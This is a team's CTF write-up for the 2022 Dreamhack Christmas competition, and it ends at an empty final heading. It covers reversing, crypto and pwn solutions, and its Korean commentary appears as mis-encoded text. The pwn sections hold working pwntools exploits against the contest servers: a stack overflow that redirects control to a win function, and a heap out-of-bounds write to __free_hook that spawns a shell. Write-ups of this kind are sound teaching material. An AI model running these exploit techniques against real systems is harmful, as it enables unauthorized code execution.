---
layout: post
category: writeup
---

<br><br>

This is a CTF that was held in 2022 Christmas on Dreamhack.
Sechack, Slyfizz and I ran as one team, and the collaboration was pretty excellent.
We even had a great final position(3rd), and unexpected prize.

It was a great experience for me.

This is Write-Up for the challenges from all 3 members in Korean.

### Team

Sechackì—¬ì¹œêµ¬í•¨

### Solved

Sechack: A, B, H, O, P, Q, S, U, W
rev4fun: D, E, F, I, N
soon_haari: G, K, L, M, R, V

<br><br><br>

# A - **Welcome**

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled.png)

sshì— ì ‘ì†í•´ë³´ë©´ rbashì…¸ë¡œ ì ‘ì†ë˜ëŠ”ê±¸ ë³¼ ìˆ˜ ìˆë‹¤. ê·¸ë˜ì„œ /read_flagë°”ì´ë„ˆë¦¬ë¥¼ ì‹¤í–‰í•  ìˆ˜ ì—†ë‹¤.

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%201.png)

ì•½ê°„ì˜ êµ¬ê¸€ë§ ê²°ê³¼ ì´ëŸ¬í•œ ì†”ë£¨ì…˜ì„ ì–»ì„ ìˆ˜ ìˆì—ˆë‹¤.

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%202.png)

<br><br><br>

# B - **MSNW**

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%203.png)

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%204.png)

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%205.png)

ë°˜ë³µì ìœ¼ë¡œ readì™€ writeë¥¼ í•´ì£¼ëŠ”ê±¸ ë³¼ ìˆ˜ ìˆë‹¤. readí• ë•Œ 2byte overflowê°€ í„°ì§€ë‹ˆê¹Œ ê·¸ëƒ¥ ìŠ¤íƒ ë¦­í•˜ê³  sfpë®ìœ¼ë©´ ëœë‹¤. ì˜¤ë²„í”Œë¡œ ë‚œ ì‹œì ìœ¼ë¡œë¶€í„° í•¨ìˆ˜ ì—í•„ë¡œê·¸ë¥¼ 2ë²ˆ ê±°ì¹˜ë‹ˆê¹Œ retë³€ì¡°í•  ìˆ˜ ìˆë‹¤.

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%206.png)

Winí•¨ìˆ˜ ìˆìœ¼ë‹ˆê¹Œ ì´ê±¸ë¡œ ë³€ì¡°í•˜ë©´ ëœë‹¤.

```python
from pwn import *

sla = lambda x, y : r.sendlineafter(x, y)
sa = lambda x, y : r.sendafter(x, y)
rvu = lambda x : r.recvuntil(x)

#r = process("./msnw")
r = remote("host3.dreamhack.games", 19028)

magic = 0x40135B

sa(": ", b"a"*0x130)

stack_leak = u64(rvu("\x7f")[-6:].ljust(8, b"\x00"))
log.info(hex(stack_leak))

sa(": ", p64(magic)*38+p16((stack_leak - 0x210) & 0xffff))

r.interactive()
```

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%207.png)

<br><br><br>

# D - **locked present**

```python
plain=[0x61, 0x5F, 0x6D, 0x65, 0x72, 0x72, 0x79, 0x5F, 0x63, 0x68, 
0x72, 0x69, 0x73, 0x74, 0x6D, 0x61, 0x73, 0x5F, 0x66, 0x6F, 0x72,
 0x5F, 0x79, 0x6F, 0x75]
sbox=[{redacted}]

inp="abcdefghijklmnopqrstuvwxy"
plain=list(map(ord,inp))
keytable=[{redacted}]

def addroundkey(a1,a2):
	for i in range(5):
		for j in range(5):
			a2[i*5+j]^=keytable[a1*25+i*5+j]

def subbytes(a1):
	for i in range(len(a1)):
		a1[i]=sbox[a1[i]]

def re_subbytes(a1):
	for i in range(len(a1)):
		a1[i]=sbox.index(a1[i])

def shiftrows(a1):
	for i in range(5):
		for j in range(i):
			v4=a1[i]
			a1[i]=a1[i+5]
			a1[i+5]=a1[i+10]
			a1[i+10]=a1[i+15]
			a1[i+15]=a1[i+20]
			a1[i+20]=v4

def re_shiftrows(a1):
	out=[0]*25
	table=[0, 6, 12, 18, 24, 5, 11, 17, 23, 4, 10, 16, 22, 3, 9, 15, 21, 2, 8, 14, 
20, 1, 7, 13, 19]
	for i in range(len(a1)):
		out[table[i]]=a1[i]
	return out

addroundkey(0,plain)
for i in range(1,11,1):
	subbytes(plain)
	shiftrows(plain)
	addroundkey(i,plain)
encrypted=plain

encrypted=[0x37, 0xA6, 0xB2, 0x27, 0xAA, 0xBE, 0xDA, 0x06, 0xD8, 0x0F, 
0x4B, 0x36, 0x49, 0x95, 0x88, 0x32, 0x75, 0x80, 0x66, 0xA2, 0xD1, 0xEA, 
0x68, 0xE2, 0x0E]

for i in range(10,-1,-1):
	addroundkey(i,encrypted)
	if i==0:
		break
	encrypted=re_shiftrows(encrypted)
	re_subbytes(encrypted)

print("".join([chr(i)for i in encrypted]))
```

ë¡œì§ì„ ë¶„ì„í•´ë³´ë©´ ë‹¨ìˆœí•œ aes ì•”í˜¸ë¥¼ êµ¬í˜„í•œ ê²ƒê³¼ ê°™ë‹¤. ë‹¤ë§Œ mixcolumns ë¶€ë¶„ì´ ë¹ ì ¸ìˆì–´ì„œ í•´ë‹¹ ë¶€ë¶„ì„ ì œì™¸í•˜ê³  êµ¬í˜„í•´ì„œ ì—­í•¨ìˆ˜ ì§œì£¼ë©´ í’€ë¦°ë‹¤.

### flag

```
DH{W0w_U_kn0w_4b0ut_AES?}
```

<br><br><br>

# E - **snow**

```python
enc=[0x97, 0x88, 0xA8, 0x86, 0x14, 0x0F, 0xE6, 0xF0, 0xE7, 0xF2, 0x92, 0x83, 
0x19, 0x7A, 0x19, 0x06, 0x6A, 0x7B, 0xE3, 0xF7, 0x6D, 0x7D, 0x96, 0x86, 0x1D,
 0x7A, 0x15, 0x7D, 0x1E, 0x7A, 0x6A, 0x42]
sss=[0x97, 0x88, 0x57, 0x5E, 0x4D, 0x5E, 0xB2, 0xA1, 0xB2, 0xA1, 0xB2, 0xA1, 
0x4D, 0x5E, 0xB2, 0xA1, 0x4D, 0x5E, 0xB2, 0xA1, 0x4D, 0x5E, 0x4D, 0x5E, 0x4D, 
0x5E, 0x4D, 0x5E, 0x4D, 0x5E, 0x4D, 0x42]

bb=[0xB2, 0xA1, 0x4D, 0x5E, 0x4D, 0x5E, 0x4D, 0x5E, 0x4D, 0x5E, 0xB2, 0xA1, 
0xB2, 0xA1, 0xB2, 0xA1, 0x4D, 0x5E, 0xB2, 0xA1, 0xB2, 0xA1, 0x4D, 0x5E, 0x4D, 
0x5E, 0x4D, 0x5E, 0x4D, 0x5E, 0x4D, 0x5E, 0x00, 0x10]
k=[]
for i in range(len(bb)):
	k.append(bb[i]^ord("a"))
flag=""
for i in range(len(enc)):
	m=enc[i]^k[i]
	if m>127:
		m=255-m
	flag+=chr(m)
print(flag)
```

í•¨ìˆ˜ê°€ ë³µì¡í•´ ë³´ì´ëŠ”ë° í•´ë‹¹ ì—°ì‚°ì„ êµ³ì´ ë¶„ì„í•˜ì§€ ì•Šê³ ë„ ë‹¨ìˆœí•œ xorì„ ì´ìš©í•œ ì•”í˜¸í™”ì—¬ì„œ ê°„ë‹¨í•˜ê²Œ ë³µêµ¬í•  ìˆ˜ ìˆë‹¤.

### flag

```python
DH{F805042AC5E59FD07ABEF1E9B2EF}
```

<br><br><br>

# F - **mixed box**

```python
sbox=[{redacted}]

def ROL(data, shift, size=32):
    shift %= size
    remains = data >> (size - shift)
    body = (data << shift) - (remains << size )
    return (body + remains)
    

def ROR(data, shift, size=32):
    shift %= size
    body = data >> shift
    remains = (data << (size - shift)) - (body << size)
    return (body + remains)

cmptable=[{redacted}]
form=b"DH{def84ijklmnopqrstuvwxyz0123456789AB}"

out=[]
xx=[]
kk=[]
import string
a=string.printable
b=list(map(ord,a))
for i in range(len(a)):
	xx.append(sbox[b[i]-1]^b[i])

for i in range(len(form)):
	kk.append(sbox[form[i]-1]^form[i])

def word(a1,a2):
	return (a1[a2+1]<<8|a1[a2])

def dword(a1,a2):
	return (a1[a2+3]<<24|a1[a2+2]<<16|a1[a2+1]<<8|a1[a2])

mm=0
count=0
out=[]

counttable=[]
while True:
	c=0x400000|(word(kk,mm))
	b=c>>count
	b=b&7
	bb=kk[b]
	out.append(bb)
	count+=3
	if count>8:
		count-=8
		mm+=1
	if mm==len(kk)-1:
		break

out.append(0)
count=0
mm=0

x=[]
for i in range(len(out)//4):
	v4=dword(out,i*4)
	v5=ROL(v4,1)
	v6 = (27 * ROR(v5 & 0x1010101, 8)) ^ v5 & 0xFEFEFEFE
	v7 = v6 ^ ROL(v6, 8)
	v8 = ROL(v4, 8)
	v9 = v8 ^ v7
	v10 = ROL(v8, 8)
	vv=ROL(v10, 8) ^ v10 ^ v9
	x.append(vv)
print([hex(i)for i in x])
```

ë³µì¡í•˜ê²Œ êµ¬í˜„ëœ ì½”ë“œë¥¼ ì „ë¶€ ë¶„ì„í•´ë³´ë©´ ìœ„ì™€ê°™ì€ ëª¨ì–‘ì˜ ë¡œì§ì„ ì–»ì–´ë‚¼ ìˆ˜ ìˆë‹¤.

sboxëŠ” objdumpë¥¼ ì´ìš©í•˜ì—¬ ë°”ì´íŠ¸ë¥¼ ì­‰ ë½‘ì•„ë‚´ì—ˆë‹¤.  

ì´ë•Œ ë‹¨ìˆœíˆ 4ë°”ì´íŠ¸ì˜ ê°’ì„ ì´ìš©í•˜ì—¬ cmptableê³¼ ë¹„êµí•˜ëŠ” ì•„ë˜ìª½ ë¶€ë¶„ì˜ ê²½ìš° z3ë¥¼ ì´ìš©í•´ì„œ ì˜¬ë°”ë¥¸ ê°’ì„ ì–»ì–´ë‚¼ ìˆ˜ ìˆë‹¤.

```python
from z3 import *
s=Solver()
def ROL(data, shift, size=32):
    shift %= size
    remains = data >> (size - shift)
    body = (data << shift) - (remains << size )
    return (body + remains)
    

def ROR(data, shift, size=32):
    shift %= size
    body = data >> shift
    remains = (data << (size - shift)) - (body << size)
    return (body + remains)
def word(a1,a2):
	return (a1[a2+1]<<8|a1[a2])

def dword(a1,a2):
	return (a1[a2+3]<<24|a1[a2+2]<<16|a1[a2+1]<<8|a1[a2])

arr=[BitVec("arr%i"%i,64)for i in range(41)]
for i in range(len(arr)):
	s.add(arr[i]<0x100000000)
	s.add(arr[i]>=0)
x=[]

for i in range(41):
	v4=arr[i]
	v5=ROL(v4,1)
	v6 = (27 * ROR(v5 & 0x1010101, 8)) ^ v5 & 0xFEFEFEFE
	v7 = v6 ^ ROL(v6, 8)
	v8 = ROL(v4, 8)
	v9 = v8 ^ v7
	v10 = ROL(v8, 8)
	vv=ROL(v10, 8) ^ v10 ^ v9
	x.append(vv)

cmptable=[{redacted}]
for i in range(len(cmptable)):
	s.add(x[i]==cmptable[i])
print(s.check())
m=s.model()
realout=[]
for i in range(len(m)):
	realout.append(int(str(m.evaluate(arr[i]))))
print(realout)
```

ê²°ê³¼

```python
sat
[{redacted}]
```

ê·¸ë¦¬ê³  ì´ë ‡ê²Œ ì•Œê²Œëœ ë°”ì´íŠ¸ì˜ hexê°’ì„ ì´ìš©í•´ì„œ sboxì— ëŒ€ì…í•˜ë©´ í”Œë˜ê·¸ì˜ ì•8ìë¦¬ë¥¼ êµ¬í•  ìˆ˜ ìˆë‹¤.

```python
DH{Sb0x,
```

ì´í›„ ìœ„ìª½ ë¶€ë¶„ì„ í•´ê²°í•´ì•¼í•˜ëŠ”ë°

ì´ë•Œ ìœ„ìª½ë¶€ë¶„ì˜ countì™€ mmì˜ íšŸìˆ˜ë¥¼ ìš°ì„ ì ìœ¼ë¡œ ì €ì¥í•´ë†“ê³  ìœ„ìª½ ì½”ë“œì˜ ê²½ìš° 

2ë°”ì´íŠ¸ë‹¹ 3ê°œì˜ checkê°’ì´ ë‚˜ì˜¤ê¸°ì— ì´ë¥¼ brute-forceë¥¼ ì´ìš©í•˜ì—¬ êµ¬í•  ìˆ˜ ìˆë‹¤.

obviousëŠ” ê° ì•„ë˜ ì½”ë“œì˜ dwordê°’ë“¤ì„ byteë¡œ ë³€í™˜í•œ í…Œì´ë¸”ì´ë‹¤.

```python
counttable=[{redacted}]
idxtable=[0xb9,0xef,0x1f,0xf6,0xce,0x42,0x96,0x37]

obvious=[{redacted}]

sbox=[{redacted}]
def word(a1,a2):
	return (a1[a2+1]<<8|a1[a2])

def dword(a1,a2):
	return (a1[a2+3]<<24|a1[a2+2]<<16|a1[a2+1]<<8|a1[a2])

mmtable=[{redacted}]
import string
import itertools
able=string.printable
form=b"DH{Sb0x,"
while True:
	for perm in itertools.product(able, repeat=2):
		aa="".join(perm)
		flag=form+bytes(aa,"utf-8")
		kk=[]
		for i in range(len(flag)):
			kk.append(sbox[flag[i]-1]^flag[i])
		out=[]
		i=0
		while True:
			c=0x400000|(word(kk,mmtable[i]))
			b=c>>counttable[i]
			b=b&7
			bb=kk[b]
			out.append(bb)
			i+=1
			if mmtable[i]==len(kk)-1:
				break
		if obvious[:len(out)]==out:
			print(form)
			print(len(out),len(obvious))
			form=flag[:-1]
			break
```

ì´ëŸ°ì‹ìœ¼ë¡œ ê°€ëŠ¥í•œ ê²½ìš°ì˜ ìˆ˜ë¥¼ ì´ìš©í•˜ì—¬ 2ë°”ì´íŠ¸ì”© ë¸Œë£¨íŠ¸í¬ìŠ¤ë¥¼ í•´ì£¼ë©´ ê°’ì´ ì­‰ ë‚˜ì˜¤ê²Œ ëœë‹¤.

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%208.png)

}ë¥¼ ì¶”ê°€í•´ì£¼ë©´

```
DH{Sb0x,Ba5e8+And_M1X#CoLUmN=/7T4IyQJhzfqp9YKrR6utOcGVFWw3Pk}
```

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%209.png)

Correct!!

### flag

```
DH{Sb0x,Ba5e8+And_M1X#CoLUmN=/7T4IyQJhzfqp9YKrR6utOcGVFWw3Pk}
```

# G - whereâ€™s the box

decryptëœ ê°’ì´ flagì˜ ë°°ìˆ˜ë©´ ê°’ì„ ì•Œë ¤ì£¼ì§€ ì•ŠëŠ”ë‹¤. 

ê·¸ë˜ì„œ flag * k = n + result (result < n)ì¸ kì˜ ê°’ì„ ì´ë¶„íƒìƒ‰ìœ¼ë¡œ ì°¾ìœ¼ë©´ ëœë‹¤. 

ex.py

```python
from pwn import *
from Crypto.Util.number import *
import time

r = remote("host1.dreamhack.games", 10852)

r.sendlineafter("[3] Get info\n", "3")

n = int(r.recvline()[3:])
g = int(r.recvline()[3:])
ct = int(r.recvline()[6:])

high = n
low = 1

while 1:
	mid = (high + low) // 2
	send_ct = pow(ct, mid, n ** 2)
	send = bytes.hex(long_to_bytes(send_ct))
	print(high)
	print(low)
	print()

	r.sendlineafter("[3] Get info", "2")
	r.sendlineafter("Input ciphertext (hex): ", send)

	res = r.recvline()
	
	if res[:1] == b'D':
		low = mid
		continue
	else:
		high = mid

	if (n + int(res)) % mid == 0:
		flag = long_to_bytes((n + int(res)) // mid)
		print(flag)
		break

r.interactive()
```

flag

```
DH{under_the_tree_at_///hobble.runner.flap}
```

<br><br><br>

# H - **Santa claus is coming to town**

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int v3; // [rsp+8h] [rbp-1B8h] BYREF
  int v4; // [rsp+Ch] [rbp-1B4h]
  __int64 v5; // [rsp+10h] [rbp-1B0h] BYREF
  __int64 v6; // [rsp+18h] [rbp-1A8h] BYREF
  _DWORD s[102]; // [rsp+20h] [rbp-1A0h] BYREF
  unsigned __int64 v8; // [rsp+1B8h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  init(argc, argv, envp);
  v3 = 0;
  v4 = 0;
  v5 = 0LL;
  v6 = 0LL;
  memset(s, 0, 0x190uLL);
  intro();
  while ( 1 )
  {
    while ( 1 )
    {
      print_menu();
      v3 = 0;
      __isoc99_scanf("%d", &v3);
      if ( v3 == 2 )
        break;
      if ( v3 == 3 )
      {
        if ( (unsigned int)santa_came(s) )
        {
          puts("Santa Claus : Oh... You're such an honest kid.");
          puts("Santa Claus : Tell me if you have any memories you want to change and erase in this year.");
          v4 = check_offset();
          if ( !v4 )
            exit(0);
          printf("what line you edit : ");
          __isoc99_scanf("%ld", &v6);
          if ( v6 < 0 )
          {
            puts("Wrong input");
            exit(0);
          }
          printf("Change memories to : ");
          read(0, (void *)(16 * (v6 - 1) + *(_QWORD *)&s[4 * v4 + 2]), 0x10uLL);
          free(*(void **)&s[4 * v4 + 2]);
          exit(0);
        }
        puts("Santa Claus just left...");
        exit(0);
      }
      if ( v3 == 1 )
      {
        v4 = check_offset();
        if ( v4 )
        {
          if ( v4 == s[4 * v4] )
          {
            puts("You already wrote.");
          }
          else
          {
            s[4 * v4] = v4;
            printf("How many lines will to write? (1 line = 16 words) : ");
            __isoc99_scanf("%ld", &v5);
            s[4 * v4 + 1] = v5;
            *(_QWORD *)&s[4 * v4 + 2] = malloc(16 * v5);
            puts("\n~~~~~~~~~~contents~~~~~~~~~~");
            read(0, *(void **)&s[4 * v4 + 2], 16 * v5 - 1);
          }
        }
      }
      else
      {
        puts("Wrong input");
      }
    }
    v4 = check_offset();
    if ( v4 )
    {
      if ( s[4 * v4] )
      {
        printf("\nPages : %p\n", *(const void **)&s[4 * v4 + 2]);
        printf("Contents : %s", *(const char **)&s[4 * v4 + 2]);
      }
      else
      {
        puts("You haven't written yet.");
      }
    }
  }
}
```

mainí•¨ìˆ˜ë¥¼ ë³´ë©´ ë©”ëª¨ ì“°ëŠ” ê¸°ëŠ¥ê³¼ ì½ëŠ” ê¸°ëŠ¥ì´ ìˆëŠ”ê±¸ ë³¼ ìˆ˜ ìˆë‹¤.

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2010.png)

ë˜ë‹¤ë¥¸ ê¸°ëŠ¥ í•˜ë‚˜ëŠ” ìˆ˜ì •í•˜ëŠ” ê¸°ëŠ¥ì¸ë° santa_cameí•¨ìˆ˜ê°€ 1ì„ ë°˜í™˜í•´ì•¼ ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤. 1ì„ ë°˜í™˜í•˜ë ¤ë©´ 24ê°œì˜ ë©”ëª¨ê°€ ê½‰ ì±„ì›Œì ¸ ìˆìœ¼ë©´ ëœë‹¤.

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2011.png)

ê·¸ë¦¬ê³  ì´ ê¸°ëŠ¥ì—ì„œ ì…ë ¥ë°›ëŠ” offsetì´ 0ë³´ë‹¤ ì‘ì€ì§€ë§Œ ê²€ì¦í•´ì„œ oobê°€ í„°ì§€ëŠ”ê±¸ ë³¼ ìˆ˜ ìˆë‹¤. ë©”ëª¨ê°€ í• ë‹¹ëœ ì²­í¬ì˜ ì£¼ì†Œë„ ê·¸ëƒ¥ ì£¼ë‹ˆê¹Œ ë§¤ìš° í¬ê²Œ í• ë‹¹í•´ì„œ mmapìœ¼ë¡œ í• ë‹¹í•˜ê²Œ í•˜ë©´ mmapëœ ì£¼ì†Œë‘ libcì£¼ì†Œë‘ offsetì´ ì¼ì •í•˜ë‹¤ëŠ”ê±¸ ì´ìš©í•´ì„œ libc leakí•  ìˆ˜ ìˆê³  oobë¡œ aawí•˜ë©´ ëë‚œë‹¤.

```python
from pwn import *

#context.log_level = "debug"

sla = lambda x, y : r.sendlineafter(x, y)
sa = lambda x, y : r.sendafter(x, y)
rvu = lambda x : r.recvuntil(x)
rv = lambda x : r.recv(x)

#r = process(["./santa_coming_to_town"], env={"LD_PRELOAD":"./libc"})
r = remote("host1.dreamhack.games", 15291)

def wr(idx, bsize, data):
    sla(">> ", "1")
    sla(": ", str(idx))
    sla(": ", str(bsize))
    sa("~\n", data)

def re(idx):
    sla(">> ", "2")
    sla(": ", str(idx))

def sle(idx, offset, data):
    sla(">> ", "3")
    sla("it? : ", str(idx))
    sla("edit : ", str(offset))
    sa("to : ", data)

wr(1, 0x3000, b"/bin/sh\x00")
for i in range(2, 26):
    wr(i, 1, b"/bin/sh\x00")

re(1)

rvu("Pages : ")
libc_leak = int(rv(14), 16)
libc_base = libc_leak - 0x5e5010
free_hook = libc_base + 0x3ed8e8
system = libc_base + 0x4f420
log.info(hex(libc_base))

re(2)

rvu("Pages : ")
heap_leak = int(rv(14), 16)

sle(2, (free_hook - heap_leak)//0x10+1, p64(system)*2)

r.interactive()
```

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2012.png)

Dockerfileë¹Œë“œí•´ì„œ í•´ë„ í™ ì˜¤í”„ì…‹ ì¢€ ì•ˆë§ì•„ì„œ ì‚½ì§ˆí–ˆë‹¤. ê·¸ëƒ¥ 0x1000ì”© ë”í•˜ê³ ë¹¼ë©´ì„œ ë¸Œí¬í•´ë³´ë©´ ê¸ˆë°© ë‚˜ì˜¨ë‹¤.

<br><br><br>

# I - **Block Cipher**

[https://scratch.mit.edu/projects/editor/?tutorial=getStarted](https://scratch.mit.edu/projects/editor/?tutorial=getStarted)

ì—¬ê¸° ë§í¬ ë“¤ì–´ê°€ì„œ ë¬¸ì œíŒŒì¼ì„ ì˜¬ë¦¬ë©´

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2013.png)

ìŠ¤í¬ë˜ì¹˜ë¡œ ë¬¸ì œíŒŒì¼ì´ ë³€í™˜ì´ ëœë‹¤.

ì¤‘ê°„ì¤‘ê°„ì— waitë¡œ ëŒ€ê¸°ë¥¼ ê±¸ê³  ë ˆì§€ìŠ¤í„° ê°’ì„ í™•ì¸í•  ìˆ˜ ìˆì–´ì„œ ì´ë¥¼ ì´ìš©í•´ì„œ ë¶„ì„í•œ ë’¤ì— ì´ë¥¼ ì „ë¶€ ì½”ë“œë¡œ ì˜®ê²¼ë‹¤.

```python
rk=[{redacted}]

hf0=[{redacted}]

hf1=[{redacted}]

inp=[61,62,63,64,65,66,67,67]
data=inp
stack=[]
def t6768():
	r9=stack[-1]
	stack[-1]=bin(r9)

def e44a():
	r9=stack[len(stack)-2]
	r10=stack[-1]
	stack.pop()
	stack.pop()
	stack.append(r10)
	stack.append(r9)

def y67r():
	r9=stack[len(stack)-2]
	r10=stack[-1]
	stack.pop()
	stack.pop()
	stack.append(r9^r10)

def g1143():
	r8=stack[-1]
	stack.pop()
	r7=stack[-1]
	stack.pop()
	r6=stack[-1]
	stack.pop()
	r5=stack[-1]
	stack.pop()
	r4=stack[-1]
	stack.pop()
	r3=stack[-1]
	stack.pop()
	r2=stack[-1]
	stack.pop()
	r1=stack[-1]
	stack.pop()
	r0=stack[-1]
	stack.pop()
	stack.append((hf0[xx[r2-1]]+rk[((r0*4)+3)])%256)
	stack.append(xx[r1-1])
	y67r()
	xx[r1-1]=stack[-1]
	stack.pop()
	stack.append(hf1[xx[r4-1]])
	stack.append(rk[r0*4+2])
	y67r()
	xx[r3-1]=((xx[r3-1]+stack[-1])%256)
	stack.pop()
	stack.append((hf0[xx[r6-1]]+rk[((r0*4)+1)])%256)
	stack.append(xx[r5-1])
	y67r()
	xx[r5-1]=stack[-1]
	stack.pop()
	stack.append(hf1[xx[r8-1]])
	stack.append(rk[r0*4-1+1])
	y67r()
	xx[r7-1]=((xx[r7-1]+stack[-1])%256)
	stack.pop()

	

xx=[0]*8
for i in range(4):
	xx[2*i+1]=data[2*i+1]
xx[0]=(data[0]+rk[0])%256
stack.append(data[2])
stack.append(rk[1])
y67r()
xx[2]=stack[-1]
stack.pop()
xx[4]=data[4]+rk[2]%256
stack.append(data[6])
stack.append(rk[3])
y67r()
xx[6]=stack[-1]
stack.pop()
r0=[2,8,7,6,5,4,3,2,1]
stack=r0
g1143()
r0=[3,7,6,5,4,3,2,1,8]
stack=r0
g1143()
r0=[4,6,5,4,3,2,1,8,7]
stack=r0
g1143()
r0=[5,5,4,3,2,1,8,7,6]
stack=r0
g1143()
r0=[6,4,3,2,1,8,7,6,5]
stack=r0
g1143()
r0=[7,3,2,1,8,7,6,5,4]
stack=r0
g1143()
r0=[8,2,1,8,7,6,5,4,3]
stack=r0
g1143()
###################
for i in range(4):
	data[2*i+1]=xx[(2*i+2)%8]

data[0]=(xx[1]+rk[4])%256
stack.append(xx[3])
stack.append(rk[5])
y67r()
data[2]=stack[-1]
stack.pop()
data[4]=(xx[5]+rk[6])%256
stack.append(xx[7])
stack.append(rk[7])
y67r()
data[6]=stack[-1]
stack.pop()

print(xx)
print(data)
```

ê·¸ëŸ¼ ìœ„ì™€ ê°™ì€ ë¡œì§ì„ì„ ì•Œ ìˆ˜ ìˆëŠ”ë° ì´ëŠ” ìƒê°ì™¸ë¡œ ì†ì‹¤ë˜ëŠ” ë¹„íŠ¸ê°€ ì—†ì–´ì„œ ì—­ì—°ì‚°ì´ ì‰½ê²Œ ëœë‹¤. 

```python
rk=[{redacted}]

hf0=[{redacted}]

hf1=[{redacted}]
data=[148,200,182,215,76,96,151,136]
xx=[0]*8

def re_g1143():
	r8=stack[-1]
	stack.pop()
	r7=stack[-1]
	stack.pop()
	r6=stack[-1]
	stack.pop()
	r5=stack[-1]
	stack.pop()
	r4=stack[-1]
	stack.pop()
	r3=stack[-1]
	stack.pop()
	r2=stack[-1]
	stack.pop()
	r1=stack[-1]
	stack.pop()
	r0=stack[-1]
	stack.pop()
	a=(hf0[xx[r2-1]]+rk[((r0*4)+3)])%256
	xx[r1-1]^=a
	a=hf1[xx[r4-1]]
	b=rk[r0*4+2]
	c=a^b
	xx[r3-1]=(xx[r3-1]-c)%256
	a=(hf0[xx[r6-1]]+rk[((r0*4)+1)])%256
	xx[r5-1]^=a
	a=hf1[xx[r8-1]]
	b=rk[r0*4-1+1]
	c=a^b
	xx[r7-1]=(xx[r7-1]-c)%256

for i in range(4):
	xx[(2*i+2)%8]=data[2*i+1]
xx[1]=(data[0]-rk[4])%256
xx[3]=rk[5]^data[2]
xx[5]=(data[4]-rk[6])%256
xx[7]=rk[7]^data[6]

r0=[8,2,1,8,7,6,5,4,3]
stack=r0
re_g1143()

r0=[7,3,2,1,8,7,6,5,4]
stack=r0
re_g1143()

r0=[6,4,3,2,1,8,7,6,5]
stack=r0
re_g1143()
r0=[5,5,4,3,2,1,8,7,6]
stack=r0
re_g1143()
r0=[4,6,5,4,3,2,1,8,7]
stack=r0
re_g1143()
r0=[3,7,6,5,4,3,2,1,8]
stack=r0
re_g1143()
r0=[2,8,7,6,5,4,3,2,1]
stack=r0
re_g1143()

data[6]=xx[6]^rk[3]
data[4]=(xx[4]-rk[2])%256
data[2]=xx[2]^rk[1]
data[0]=(xx[0]-rk[0])%256

for i in range(4):
	data[2*i+1]=xx[2*i+1]
print(data)
```

ì´ë ‡ê²Œ ì—­ì—°ì‚°ì„ ì‘ì„±í•˜ê³ 

```python
22,53,9,18,95,37,57,61
```

 scratchì— ê²°ê³¼ë¥¼ ë„£ì–´ì£¼ë©´

![Untitled](../files/christmas%20ctf%202022%205793e210ad10417bab0c141efed21db1/Untitled%2014.png)

ë§ë‹¤ê³  ë‚˜ì˜¨ë‹¤.

### flag

```python
DH{22,53,9,18,95,37,57,61}
```

<br><br><br>

# K - find a gift

ì´ì§„ íŠ¸ë¦¬ì˜ 1024ê°œì˜ ë…¸ë“œë¥¼ ë‹¤ ëŒì•„ë³´ë©´ ëœë‹¤. 

ië²ˆì§¸ ë…¸ë“œë¥¼ ë°©ë¬¸í•  ë•ŒëŠ” i // 2, ië¥¼ ë°©ë¬¸í•˜ë©´ ëœë‹¤. 

ex.py

```python
from pwn import *
import time

r = remote("host3.dreamhack.games", 13431)

r.recvline()

for i in range(2, 1024):
	r.sendlineafter("---\naddress : ", str(i // 2))
	r.sendlineafter("---\naddress : ", str(i))
	print(f"{i}: {r.recvline()}")

r.interactive()
```

flag

```
DH{Yeah!! I found a Christmas gift box!!}
```

<br><br><br>

# L - Collatz conjecture

í™€ìˆ˜ë©´ 3k + 1, ì§ìˆ˜ë©´ k / 2ê°€ ë˜ëŠ” ê³¼ì •ì„ êµ¬í˜„í•´ ë†“ì•˜ê³ , ë§ˆì§€ë§‰ì— 1ë¡œ ìˆ˜ë ´í•˜ê²Œ ë˜ë©´ ì‹¤íŒ¨ì´ë‹¤. 

int64ë¡œ êµ¬í˜„ë˜ì–´ ìˆê¸° ë•Œë¬¸ì— (2^64 - 1) / 3ì„ ì§‘ì–´ë„£ì–´ì£¼ë©´ í’€ë¦°ë‹¤. 

```
DH{Collatz_Conjecture_1s_FALSE____Proof_by_AC}
```

<br><br><br>

# M - the present

prngê°€ ì œê³±ì„ í•´ì£¼ëŠ” ì—°ì‚°ë§Œì„ ì§„í–‰í•´ì¤€ë‹¤. 

ëª¨ë“ˆëŸ¬ ë‚´ì—ì„œ ì œê³±ê·¼ì„ ë‘ ë²ˆ ì‹¤í–‰í•´ì£¼ë©´ ëœë‹¤. 

ë¬¼ë¡  ê°€ëŠ¥í•œ ê²½ìš°ì˜ ìˆ˜ë¥¼ ë‹¤ ì‹¤í–‰í•´ì£¼ì–´ì•¼ í•œë‹¤. 

ex.sage

```python
from Crypto.Util.number import *

M = 12045184283108733282877246918018456795629932264538806786957088609817236359725183272225617590814403324378457302095025664842376149624271113548645334599894051
rand = 321609188014782817530081099017386870899897457530475334351599692725892773281779472409503390776505529932157130216692885548245652532540341302761980076422023

m1 = Mod(rand, M).sqrt()
m2 = -m1

m = m2.sqrt()
print(long_to_bytes(int(m)))
print(long_to_bytes(int(-m)))
```

flag

```
DH{M3rry_ChrI5tM4s_And_4_h4pPy_N3w_y34R_3verY0n3}
```

<br><br><br>

# N - **lolololologfile**

